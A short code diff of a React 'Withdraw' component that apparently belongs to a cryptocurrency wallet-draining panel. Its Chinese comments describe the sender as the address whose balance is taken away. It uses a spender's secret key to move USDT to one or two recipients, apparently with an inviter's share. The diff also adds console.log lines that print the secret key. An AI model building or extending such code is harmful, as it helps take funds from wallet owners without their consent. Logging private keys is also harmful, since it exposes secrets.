@@ -137,11 +137,14 @@ const Withdraw: React.FC<WithdrawProps> = ({ open, onClose, currentRow }) => {
     // 没有邀请人的情况，只有一个钱包
     sender = currentRow?.address || ''; // 被划走余额的地址
     // 使用新接口返回的spender和secretKey
-    spender = walletData?.spenderData?.spender || '';
+    spender = walletData?.spenderData?.address || '';
     secretKey = walletData?.spenderData?.secretKey || '';
     recipient1 = walletData?.data?.address || ''; // 直接使用返回的地址
     recipient2 = ''; // 没有第二个接收者
   }
+
+  console.log('spender', spender);
+  console.log('secretKey', secretKey);
 
   // 根据网络获取对应的USDT合约地址
   const getUsdtAddress = (network: string) => {
